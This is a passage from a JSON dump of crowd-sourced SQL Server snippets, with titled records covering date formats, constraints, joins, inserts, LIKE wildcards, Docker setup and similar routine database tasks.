    "description": "Cast( '2011-07-07' as date ) as convertedDate\nExample  SELECT CONVERT(varchar, '2017-08-25', 101);  CONVERT(data_type(length), expression, style)  Converting datetime to character: Without century\tWith century\tInput/Output\tStandard 0\t100\tmon dd yyyy hh:miAM/PM\tDefault 1\t101\tmm/dd/yyyy\tUS 2\t102\t yyyy.mm.dd\tANSI 3\t103\t dd/mm/yyyy\tBritish/French 4\t104\tdd.mm.yyyy\tGerman 5\t105\t dd-mm-yyyy\tItalian 6\t106\tdd mon yyyy\t- 7\t107\tMon dd, yyyy\t- 8\t108\thh:mm:ss\t- 9\t109\tmon dd yyyy hh:mi:ss:mmmAM (or PM)\tDefault + millisec 10\t110\tmm-dd-yyyy\tUSA 11\t111\t yyyy/mm/dd\tJapan 12\t112\t yyyymmdd\tISO 13\t113\tdd mon yyyy hh:mi:ss:mmm\tEurope (24 hour clock)> 14\t114\thh:mi:ss:mmm\t24 hour clock 20\t120\tyyyy-mm-dd hh:mi:ss\tODBC canonical (24 hour clock) 21\t121\tyyyy-mm-dd hh:mi:ss.mmm\tODBC canonical (24 hour clock)  \t126\tyyyy-mm-ddThh:mi:ss.mmm\tISO8601  \t127\tyyyy-mm-ddThh:mi:ss.mmmZ\tISO8601 (with time zone Z)  \t130\tdd mon yyyy hh:mi:ss:mmmAM\tHijiri  \t131\tdd/mm/yy hh:mi:ss:mmmAM\tHijiri \n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4187,
    "keyword": null,
    "link": null,
    "title": " sql server create constraint",
    "description": "ALTER TABLE my_table ALTER COLUMN [Name] VARCHAR(50) NOT NULL; ALTER TABLE my_table ADD CONSTRAINT UQ__Constrai UNIQUE (ID); ALTER TABLE my_table ADD PRIMARY KEY (ID); -- Get constraints names SELECT CONSTRAINT_NAME,      TABLE_SCHEMA ,      TABLE_NAME,      CONSTRAINT_TYPE      FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS    WHERE TABLE_NAME='my_table'; ALTER TABLE my_table DROP CONSTRAINT PK__Constrai__xxxxx;\n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4188,
    "keyword": null,
    "link": null,
    "title": " sql server create table column default value constraint name",
    "description": "ALTER TABLE <table_name> ADD DEFAULT <DEFAULT_VALUE> FOR <NAME_OF_COLUMN>\nName Varchar(255) default \"Fred\"\n    CREATE TABLE dbo.doc_exz (       column_a INT,       column_b INT CONSTRAINT DF_Doc_Exz_Column_B DEFAULT 50); \n",
    "reg_date": "2021-10-12T10:00:41.000Z"
  },
  {
    "id": 4189,
    "keyword": null,
    "link": null,
    "title": " sql server current date",
    "description": "GETDATE() \nSELECT CAST( GETDATE() AS Date ) ;\nSELECT getdate(); -- Get Current date in SQL Server\nINSERT INTO my_table (last_updated) VALUES(NOW()); INSERT INTO my_table (last_updated) VALUES(sysdate);\t-- Oracle INSERT INTO my_table (last_updated) VALUES(getdate());\t-- SQL Server\nGETDATE()\nAdd GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4190,
    "keyword": null,
    "link": null,
    "title": " sql server current date minus 5 years",
    "description": "SELECT GETDATE() 'Today',             DATEADD(day,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(dd,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(d,-2,GETDATE()) 'Today - 2 Days' \n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4191,
    "keyword": null,
    "link": null,
    "title": " sql server current date without time",
    "description": "SELECT CAST (GETDATE() AS DATE)\nselect CAST(GETDATE() as time(0))\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4192,
    "keyword": null,
    "link": null,
    "title": " sql server current time without date",
    "description": "select CAST(GETDATE() as time(0))\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4193,
    "keyword": null,
    "link": null,
    "title": " sql server date format yyyy-MM-ddThh:mm:ss",
    "description": "select REPLACE(convert(varchar, getdate() , 20), ' ', 'T')  \nconvert(varchar, [column_date], 20) --(date or datetime) to yyyy-MM-dd HH:mm:ss convert(varchar, [column_date], 23) --(date or datetime) to yyyy-MM-dd  --ref https://www.mssqltips.com/sqlservertip/1145/date-and-time-conversions-using-sql-server/\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4194,
    "keyword": null,
    "link": null,
    "title": " sql server datetime vs datetime2",
    "description": "The MSDN documentation for datetime recommends using datetime2. Here is their recommendation:  Use the time, date, datetime2 and datetimeoffset data types for new work. These types align with the SQL Standard. They are more portable. time, datetime2 and datetimeoffset provide more seconds precision. datetimeoffset provides time zone support for globally deployed applications.  datetime2 has larger date range, a larger default fractional precision, and optional user-specified precision. Also depending on the user-specified precision it may use less storage.\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4195,
    "keyword": null,
    "link": null,
    "title": " sql server decimal",
    "description": "-- DECIMAL(p,s)     p: number of digits (lkeft+right)  s: number of digits (right) -- NUMERIC and DECIMAL are synonyms CREATE TABLE test.sql_decimal (     dec_col DECIMAL (4, 2)\t\t-- Max total 4 digits, including 2 after decimal ); INSERT INTO test.sql_decimal (dec_col) VALUES (10.05);\t\t-- OK 4 digits INSERT INTO test.sql_decimal (dec_col) VALUES (21.0425);\t-- KO\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4196,
    "keyword": null,
    "link": null,
    "title": " sql server delete records that have a single duplicate column",
    "description": "WITH cte AS (     SELECT          contact_id,          first_name,          last_name,          email,          ROW_NUMBER() OVER (             PARTITION BY                  first_name,                  last_name,                  email             ORDER BY                  first_name,                  last_name,                  email         ) row_num      FROM          sales.contacts ) DELETE FROM cte WHERE row_num > 1; \n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4197,
    "keyword": null,
    "link": null,
    "title": " sql server delete row",
    "description": "DELETE FROM my_table WHERE id = 3; DELETE FROM my_table;                   -- All rows DELETE TOP 10 FROM my_table;            -- First 10 rows DELETE TOP 10 PERCENT FROM my_table;    -- First 10% of rows\n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4198,
    "keyword": null,
    "link": null,
    "title": " sql server delete top 1000",
    "description": ";WITH CTE AS ( SELECT TOP 1000 * FROM [table] ORDER BY column ) DELETE FROM CTE \n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4199,
    "keyword": null,
    "link": null,
    "title": " sql server docker container",
    "description": "docker run -e \"ACCEPT_EULA=Y\" -e \"SA_PASSWORD=<YourStrong@Passw0rd>\" `    -p 1433:1433 --name sql1 `    -d mcr.microsoft.com/mssql/server:2019-CU3-ubuntu-18.04 \n# Run container docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=yourStrong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2017-latest  # Connect to container docker exec -it [id] /opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P \"<YourStrong@Passw0rd>\" \n",
    "reg_date": "2021-10-12T10:00:42.000Z"
  },
  {
    "id": 4200,
    "keyword": null,
    "link": null,
    "title": " sql server drop constraint default value",
    "description": "ALTER TABLE [TheTable] DROP CONSTRAINT [TheDefaultConstraint] \n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4201,
    "keyword": null,
    "link": null,
    "title": " sql server drop table if exists",
    "description": "DROP TABLE IF EXISTS dbo.Customers \nDROP TABLE IF EXISTS dbo.Scores\nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL DROP TABLE dbo.Scores; \nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL    DROP TABLE dbo.Scores;  \n-- Classic table IF OBJECT_ID('my_schema.my_table', 'U') IS NOT NULL DROP TABLE my_schema.my_table;  -- Temporary table IF OBJECT_ID('tempdb.my_schema.#my_table') IS NOT NULL DROP TABLE #my_table; \n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4202,
    "keyword": null,
    "link": null,
    "title": " sql server drop temp table if exists",
    "description": "IF OBJECT_ID('tempdb..#Results') IS NOT NULL DROP TABLE #Results GO\nIF OBJECT_ID('tempdb..#Results') IS NOT NULL DROP TABLE #Results\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4203,
    "keyword": null,
    "link": null,
    "title": " sql server execute stored procedure with parameters",
    "description": "CREATE PROCEDURE dbo.uspGetAddress @City nvarchar(30) AS SELECT * FROM Person.Address WHERE City = @City  EXEC dbo.spGetAddress @City = 'Bordeaux'\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4204,
    "keyword": null,
    "link": null,
    "title": " sql server find all foreign keys that reference a column",
    "description": "EXEC sp_fkeys 'TableName'\nSELECT     OBJECT_NAME(f.parent_object_id) TableName,    COL_NAME(fc.parent_object_id,fc.parent_column_id) ColName FROM     sys.foreign_keys AS f INNER JOIN     sys.foreign_key_columns AS fc        ON f.OBJECT_ID = fc.constraint_object_id INNER JOIN     sys.tables t        ON t.OBJECT_ID = fc.referenced_object_id WHERE     OBJECT_NAME (f.referenced_object_id) = 'YourTableName'\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4205,
    "keyword": null,
    "link": null,
    "title": " sql server find columns list in tables",
    "description": "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'DIM_VENDING_MATERIALS'\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4206,
    "keyword": null,
    "link": null,
    "title": " sql server find table name",
    "description": "select * from sys.tables where name like '%tablename%' \n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4207,
    "keyword": null,
    "link": null,
    "title": " sql server find tables referenced foreign key",
    "description": "EXEC sp_fkeys 'TableName'\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4208,
    "keyword": null,
    "link": null,
    "title": " sql server for loop",
    "description": "DECLARE @cnt INT = 0;  WHILE @cnt < cnt_total BEGIN    {...statements...}    SET @cnt = @cnt + 1; END;\n/* For loop in sql */ Example: DECLARE     a number(2);  BEGIN     FOR a in 10 .. 20 LOOP        dbms_output.put_line('value of a: ' || a);    END LOOP;  END;  /   Output: value of a: 10  value of a: 11  value of a: 12  value of a: 13  value of a: 14  value of a: 15  value of a: 16  value of a: 17  value of a: 18  value of a: 19  value of a: 20  \n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4209,
    "keyword": null,
    "link": null,
    "title": " sql server foreign key",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nALTER TABLE database.table   ADD COLUMN columnname INT DEFAULT(1),   ADD FOREIGN KEY fk_name(fk_column) REFERENCES reftable(refcolumn) ON DELETE CASCADE;\nCREATE TABLE Orders (     OrderID int NOT NULL,     OrderNumber int NOT NULL,     PersonID int,     PRIMARY KEY (OrderID),     FOREIGN KEY (PersonID) REFERENCES Persons(PersonID) );\nCREATE TABLE Orders (     OrderID int NOT NULL PRIMARY KEY,     OrderNumber int NOT NULL,     PersonID int FOREIGN KEY REFERENCES Persons(PersonID) );\n",
    "reg_date": "2021-10-12T10:00:43.000Z"
  },
  {
    "id": 4210,
    "keyword": null,
    "link": null,
    "title": " sql server get current date",
    "description": "GETDATE() \nSELECT getdate(); -- Get Current date in SQL Server\nGETDATE()\nAdd GETDATE() in sql query where you want to pass current timestamp.  Example Return the current database system date and time:  SELECT GETDATE();\nSELECT getdate()\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4211,
    "keyword": null,
    "link": null,
    "title": " sql server get users",
    "description": "select * from master.sys.server_principals\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4212,
    "keyword": null,
    "link": null,
    "title": " sql server get utc date",
    "description": "GETUTCDATE()\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4213,
    "keyword": null,
    "link": null,
    "title": " sql server get week dates from week number",
    "description": "datepart(wk, DateToParse)\nSELECT TO_CHAR(your_table.date_colunm, 'DAY') FROM your_table;\nSELECT   \tDATEADD(DAY, 2 - DATEPART(WEEKDAY, GETDATE()), CAST(GETDATE() AS DATE)) [Week_Start_Date],   \tDATEADD(DAY, 8 - DATEPART(WEEKDAY, GETDATE()), CAST(GETDATE() AS DATE)) [Week_End_Date] \n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4214,
    "keyword": null,
    "link": null,
    "title": " sql server if exists update else insert",
    "description": "if exists(SELECT * from Student where FirstName='Akhil' and LastName='Mittal')             BEGIN              update Student set FirstName='Anu' where FirstName='Akhil'   End                     else             begin   insert into Student values(1,'Akhil','Mittal',28,'Male',2006,'Noida','Tenth','LFS','Delhi')   end \n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4215,
    "keyword": null,
    "link": null,
    "title": " sql server insert inner join",
    "description": "INSERT INTO Orders ( userid, timestamp)  SELECT Orders.userid, Orders.timestamp FROM Users INNER JOIN Orders ON  Orders.id = Users.id \n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4216,
    "keyword": null,
    "link": null,
    "title": " sql server insert into",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nINSERT INTO Customer (FirstName, LastName, City, Country, Phone) VALUES ('Craig', 'Smith', 'New York', 'USA', 1-01-993 2800)\n-- Note: This is specifically for SQL - Oracle -- --------------------------------------------------------------- -- OPTION 1: Insert specific values (other values will be null)  -- syntax  INSERT INTO <TABLE_NAME> (<column1>,<column2>,<column3>,...)  VALUES (<value1>,<value2>,<value3>,...);  -- example INSERT INTO SALES (SALE_ID,ITEM_ID,QUANTITY,AMOUNT) VALUES (631,13,4,59.99); -- --------------------------------------------------------------- -- OPTION 2: Insert a value for every field  -- syntax INSERT INTO <TABLE_NAME> VALUES (<value1>,<value2>,...,<valueN>);  -- example (SALES table only consists of 4 columns) INSERT INTO SALES VALUES (631,13,4,59.99); -- ---------------------------------------------------------------\nINSERT INTO client (prenom, nom, ville, age)  VALUES  ('R&eacute;becca', 'Armand', 'Saint-Didier-des-Bois', 24),  ('Aim&eacute;e', 'Hebert', 'Marigny-le-Ch&acirc;tel', 36),  ('Marielle', 'Ribeiro', 'Maill&egrave;res', 27),  ('Hilaire', 'Savary', 'Conie-Molitard', 58);\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nINSERT INTO sales.addresses (street, city, state, zip_code)  SELECT     street,     city,     state,     zip_code FROM     sales.customers ORDER BY     first_name,     last_name;  \n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4217,
    "keyword": null,
    "link": null,
    "title": " sql server insert into select",
    "description": "INSERT INTO table2 SELECT * FROM table1 WHERE condition;\nINSERT INTO sales.addresses (street, city, state, zip_code)  SELECT     street,     city,     state,     zip_code FROM     sales.customers ORDER BY     first_name,     last_name;  \nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4218,
    "keyword": null,
    "link": null,
    "title": " sql server insert into temp table",
    "description": "--This will create a temp table on the fly SELECT last_name, first_name, hire_date, job_title  INTO #tmp_employees FROM dbo.employee WHERE hire_date > '1/1/2010'\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4219,
    "keyword": null,
    "link": null,
    "title": " sql server insert multiple rows",
    "description": "INSERT INTO table_name (column_list) VALUES     (value_list_1),     (value_list_2),     ...     (value_list_n); \n-- External tool only syntax    INSERT    {       [BULK]       { database_name.schema_name.table_or_view_name | schema_name.table_or_view_name | table_or_view_name }       ( <column_definition> )       [ WITH (           [ [ , ] CHECK_CONSTRAINTS ]           [ [ , ] FIRE_TRIGGERS ]           [ [ , ] KEEP_NULLS ]           [ [ , ] KILOBYTES_PER_BATCH = kilobytes_per_batch ]           [ [ , ] ROWS_PER_BATCH = rows_per_batch ]           [ [ , ] ORDER ( { column [ ASC | DESC ] } [ ,...n ] ) ]           [ [ , ] TABLOCK ]       ) ]   }      [; ] <column_definition> ::=    column_name <data_type>       [ COLLATE collation_name ]       [ NULL | NOT NULL ]      <data type> ::=    [ type_schema_name . ] type_name        [ ( precision [ , scale ] | max ]   \n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4220,
    "keyword": null,
    "link": null,
    "title": " sql server joins",
    "description": "/*General Formula For Joins*/ SELECT Column_List FROM Left_Table_Name JOIN_TYPES Right_Table_Name ON Join_Condition  /*INNER JOIN - Matching Rows + Non Matching Rows are Eliminated   LEFT JOIN - Matching Rows + Non Matching Rows from the Left table   RIGHT JOIN - Matching Rows + Non Matching Rows from the Right table   FULL JOIN - Matching Rows + Non Matching Rows from the Both  tables   CROSS JOIN - Return cartesian product of the tables involved in the Join   SELF JOIN - Return each table row is combined with itself and with every other table row.   The SELF JOIN can be thought of as a JOIN of two copies of the same tables.*/    /*Cross Join*/ SELECT Column_List FROM Left_Table_Name CROSS JOIN Right_Table_Name\nSELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;\nINNER JOIN: is used when retrieving data from multiple tables and will return only matching data.  LEFT OUTER JOIN: is used when retrieving data from multiple tables and will return left table and any matching right table records.  RIGHT OUTER JOIN: is used when retrieving data from multiple tables and will return right table and any matching left table records  FULL OUTER JOIN: is used when retrieving data from multiple tables and will return both table records, matching and non-matching.    INNER JOIN : SELECT select_list From TableA A Inner Join TableB B On A.Key = B.Key   LEFT OUTER JOIN : SELECT select_list From TableA A Left Join TableB B On A.Key = B.Key  (where b.key is null)//For delete matching data    RIGTH OUTER JOIN : SELECT select_list From TableA A Right Join TableB B On A.Key = B.Key   FULL JOIN : SELECT select_list From TableA A FULL OUTER Join TableB B On A.Key = B.Key  \nCREATE PROCEDURE SP_Purechase_Selecte  AS  SELECT p.P_Id , p.p_name, p.alias_name, p.alias_code, p.p_name_inlocal_language, p.barcode, p.buy_price, p.sell_price_tak, p.sell_price_ko, p.qty, typeQty.qty_type, b.brand_name, CA.cat_name , SN.sn_name ,  P.P_Description , p.Barwari_Krin    FROM tbl_Purchase p   INNER JOIN tbl_Qty_Type typeQty ON P.qty_type_id=typeQty.id  INNER JOIN tbl_Brand b ON p.brand_id=b.brand_id  INNER JOIN tbl_Catigory CA ON P.cat_id =CA.cat_id  INNER JOIN tbl_Sceintific_Name SN ON p.sn_id= SN.sn_id  INNER JOIN tbl_Product_Creation  GROUP BY P.P_Id,  CA.Cat_Name , P.P_Name , SN .Sn_Name , P.sellPrice , P.buyPrice , P.Barcode ,  P.Qty , P.P_Description, p.Barwari_Krin  RETURN\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4221,
    "keyword": null,
    "link": null,
    "title": " sql server last executed query",
    "description": "SELECT deqs.last_execution_time AS [Time], dest.text AS [Query], dest.* FROM sys.dm_exec_query_stats AS deqs CROSS APPLY sys.dm_exec_sql_text(deqs.sql_handle) AS dest WHERE dest.dbid = DB_ID('msdb') ORDER BY deqs.last_execution_time DESC  SELECT dest.TEXT AS [Query], deqs.execution_count [Count], deqs.last_execution_time AS [Time] FROM sys.dm_exec_query_stats AS deqs CROSS APPLY sys.dm_exec_sql_text(deqs.sql_handle) AS dest ORDER BY deqs.last_execution_time DESC\n",
    "reg_date": "2021-10-12T10:00:44.000Z"
  },
  {
    "id": 4222,
    "keyword": null,
    "link": null,
    "title": " sql server like",
    "description": "WHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"\nSELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\neturns true if the operand value matches a pattern. Example: Returns true if the user&rsquo;s first_name ends with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name LIKE '%son'; \nWHERE CustomerName LIKE 'a%'\t --Finds any values that start with \"a\" WHERE CustomerName LIKE '%a'\t --Finds any values that end with \"a\" WHERE CustomerName LIKE '%or%'\t --Finds any values that have \"or\" in any position WHERE CustomerName LIKE '_r%'\t --Finds any values that have \"r\" in the second position WHERE CustomerName LIKE 'a__%'\t --Finds any values that start with \"a\" and are at least 3 characters in length WHERE ContactName LIKE 'a%o'\t --Finds any values that start with \"a\" and ends with \"o\"  (Like) Operator for partial searches using wildcard '%' and '_' For Example: Select * From Employees Where last_name LIKE '_a%';\nSELECT ime, prezime FROM studenti WHERE ime LIKE 'a_a'\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4223,
    "keyword": null,
    "link": null,
    "title": " sql server like wildcard",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n-- example SELECT Id, ProductName, UnitPrice, Package   FROM Product  WHERE ProductName LIKE 'Cha_' OR ProductName LIKE 'Chan_'\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4224,
    "keyword": null,
    "link": null,
    "title": " sql server list table sizes",
    "description": "SELECT      t.NAME AS TableName,     s.Name AS SchemaName,     p.rows,     SUM(a.total_pages) * 8 AS TotalSpaceKB,      CAST(ROUND(((SUM(a.total_pages) * 8) / 1024.00), 2) AS NUMERIC(36, 2)) AS TotalSpaceMB,     SUM(a.used_pages) * 8 AS UsedSpaceKB,      CAST(ROUND(((SUM(a.used_pages) * 8) / 1024.00), 2) AS NUMERIC(36, 2)) AS UsedSpaceMB,      (SUM(a.total_pages) - SUM(a.used_pages)) * 8 AS UnusedSpaceKB,     CAST(ROUND(((SUM(a.total_pages) - SUM(a.used_pages)) * 8) / 1024.00, 2) AS NUMERIC(36, 2)) AS UnusedSpaceMB FROM      sys.tables t INNER JOIN           sys.indexes i ON t.OBJECT_ID = i.object_id INNER JOIN      sys.partitions p ON i.object_id = p.OBJECT_ID AND i.index_id = p.index_id INNER JOIN      sys.allocation_units a ON p.partition_id = a.container_id LEFT OUTER JOIN      sys.schemas s ON t.schema_id = s.schema_id WHERE      t.NAME NOT LIKE 'dt%'      AND t.is_ms_shipped = 0     AND i.OBJECT_ID > 255  GROUP BY      t.Name, s.Name, p.Rows ORDER BY      TotalSpaceMB DESC, t.Name\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4225,
    "keyword": null,
    "link": null,
    "title": " sql server list user permissions",
    "description": "-- SQL Server: list of users and roles SELECT dp.NAME      AS principal_name,        dp.TYPE_DESC AS principal_type_desc,        o.NAME       AS object_name,        p.PERMISSION_NAME,        p.STATE_DESC AS permission_state_desc FROM sys.database_permissions p          LEFT OUTER JOIN sys.all_objects o                          ON p.MAJOR_ID = o.OBJECT_ID          INNER JOIN sys.database_principals dp                     ON p.GRANTEE_PRINCIPAL_ID = dp.PRINCIPAL_ID;\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4226,
    "keyword": null,
    "link": null,
    "title": " sql server loop over query",
    "description": "DECLARE @id INT DECLARE @name NVARCHAR(100) DECLARE @getid CURSOR  SET @getid = CURSOR FOR SELECT table.id,        table.name FROM   table  OPEN @getid FETCH NEXT FROM @getid INTO @id, @name WHILE @@FETCH_STATUS = 0 BEGIN     EXEC stored_proc @varName=@id, @otherVarName='test', @varForName=@name     FETCH NEXT     FROM @getid INTO @id, @name END  CLOSE @getid DEALLOCATE @getid \n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4227,
    "keyword": null,
    "link": null,
    "title": " sql server management studio",
    "description": "/* Answer to: \"sql server management studio\" */  /*   SQL Server Management Studio is a software application first   launched with Microsoft SQL Server 2005 that is used for   configuring, managing, and administering all components   within Microsoft SQL Server. It's the successor to the   Enterprise Manager in SQL 2000 or before.      To download this application go to: https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms */\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4228,
    "keyword": null,
    "link": null,
    "title": " sql server management studio reset cache",
    "description": "DBCC FREEPROCCACHE DBCC DROPCLEANBUFFERS  DBCC DROPCLEANBUFFERS clears clean (unmodified) pages from the buffer pool Precede that with a CHECKPOINT to flush any dirty pages to disk first DBCC FLUSHPROCINDB clears execution plans for that database\nsql server reset cach\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4229,
    "keyword": null,
    "link": null,
    "title": " sql server management studio turn on line numbers",
    "description": "-- SQL Server Management Studio:  Tools -> Options > Text Editor > Transact-SQL > General > Display > Line numbers\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4230,
    "keyword": null,
    "link": null,
    "title": " sql server obtener fecha en formato dd/mm/yyyy",
    "description": "convert( datetime, fecha, 103 )\nFORMAT (getdate(), 'dd-MM-yy')\nCONVERT(varchar,@Existingdate,6)\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4231,
    "keyword": null,
    "link": null,
    "title": " sql server obtener nombre sin espacios en blanco",
    "description": "LTRIM(string): Elimina todos los espacios en blanco del comienzo de la cadena.  RTRIM(string): Elimina todos los espacios en blanco del final de la cadena.  REPLACE(string, caracter a remplazar, caracter por el que se remplaza ):\n",
    "reg_date": "2021-10-12T10:00:45.000Z"
  },
  {
    "id": 4232,
    "keyword": null,
    "link": null,
    "title": " sql server on mac m1",
